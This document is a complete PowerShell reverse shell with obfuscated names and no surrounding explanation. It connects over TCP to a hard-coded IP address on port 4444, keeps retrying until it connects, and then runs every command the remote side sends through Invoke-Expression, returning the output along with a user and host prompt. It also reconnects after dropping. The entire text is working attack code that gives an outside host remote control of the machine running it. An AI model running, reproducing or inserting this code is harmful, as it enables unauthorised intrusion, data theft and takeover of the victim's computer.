class UqtdIiUMQIdwMgTSHepy {
    
    [string]$ZDwABPGgnxiehaJryAhP = "93.49.240.195"
    [int]$KKifpaDnSqFUFreQXB = 4444

    $zEuvlPq
    $LIIZSNxGgEQhNcBFr
    $IATsaRrMEBnkonbjORxA
    $qtMqHRCya
    $yuEFzejwN
    $YAruOClQCMFBhPwaeAlM
    [int]$TkpnH = 50*1024

    YSdprWTeRdHdq() {
        $this.LIIZSNxGgEQhNcBFr = $false
        while ($true) {
            try {
                $this.LIIZSNxGgEQhNcBFr = New-Object Net.Sockets.TcpClient($this.ZDwABPGgnxiehaJryAhP, $this.KKifpaDnSqFUFreQXB)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.nAILBEKQFEAHgf()
    }

    nAILBEKQFEAHgf() {
        $this.zEuvlPq = $this.LIIZSNxGgEQhNcBFr.GetStream()
        $this.qtMqHRCya = New-Object Byte[] $this.TkpnH
        $this.YAruOClQCMFBhPwaeAlM = New-Object Text.UTF8Encoding
        $this.IATsaRrMEBnkonbjORxA = New-Object IO.StreamWriter($this.zEuvlPq, [Text.Encoding]::UTF8, $this.TkpnH)
        $this.yuEFzejwN = New-Object System.IO.StreamReader($this.zEuvlPq)
        $this.IATsaRrMEBnkonbjORxA.AutoFlush = $true
    }

    xhWlKWbmi() {
        $this.YSdprWTeRdHdq()
        $this.sDWJIl()
    }

    ePcqsTlopaaM($gSjPrkAjfi) {
        try {
            [byte[]]$cLfhEOTaHUaSyIsb = [text.Encoding]::Ascii.GetBytes($gSjPrkAjfi)
            $this.IATsaRrMEBnkonbjORxA.Write($cLfhEOTaHUaSyIsb, 0, $cLfhEOTaHUaSyIsb.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.xhWlKWbmi()
        }
    }

    [string] ABZPeD() {
        try {
            $LTIhEyXfWFxpNbacDha = $this.zEuvlPq.Read($this.qtMqHRCya, 0, $this.TkpnH)    
            $eqniJv = ($this.YAruOClQCMFBhPwaeAlM.GetString($this.qtMqHRCya, 0, $LTIhEyXfWFxpNbacDha))
            return $eqniJv
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.xhWlKWbmi()
            return ""
        }
    }

    [string] ihwZPb($qoycMIPluGlPTULVQ) {
        Write-Host $qoycMIPluGlPTULVQ
        try { 
            $fwGyASSr = Invoke-Expression $qoycMIPluGlPTULVQ | Out-String
        }
        catch {
            $oRQPeMaOKTDxBtCU = $_.Exception
            $tOKCoRPIqdvsbtt = $_.Message
            $fwGyASSr = "`n$_`n"
        }
        return $fwGyASSr
    }

    [string] HNYjk() {
        $sDuRAzzbvwYlUEglFSEeZQS = [Environment]::UserName
        $TtxGLmimZZBJWPSwOwOd = [System.Net.Dns]::GetHostName()
        $VwDnRroEz = Get-Location
        return "$sDuRAzzbvwYlUEglFSEeZQS@$TtxGLmimZZBJWPSwOwOd [$VwDnRroEz]~$ "
    }

    sDWJIl() {
        while ($this.LIIZSNxGgEQhNcBFr.Connected) {
            $this.ePcqsTlopaaM($this.HNYjk())         
            $eqniJv = $this.ABZPeD()
            $fwGyASSr = "`n"
            if ([string]::IsNullOrEmpty($eqniJv)) {
                continue
            }
            $fwGyASSr = $this.ihwZPb($eqniJv)
            $this.ePcqsTlopaaM($fwGyASSr + "`n")
            $this.zEuvlPq.Flush()
        }
        $this.LIIZSNxGgEQhNcBFr.Close()
        $this.xhWlKWbmi()
    } 
}

$yoxbCSFnsXLCdDRWZid = [UqtdIiUMQIdwMgTSHepy]::new()
$yoxbCSFnsXLCdDRWZid.xhWlKWbmi()
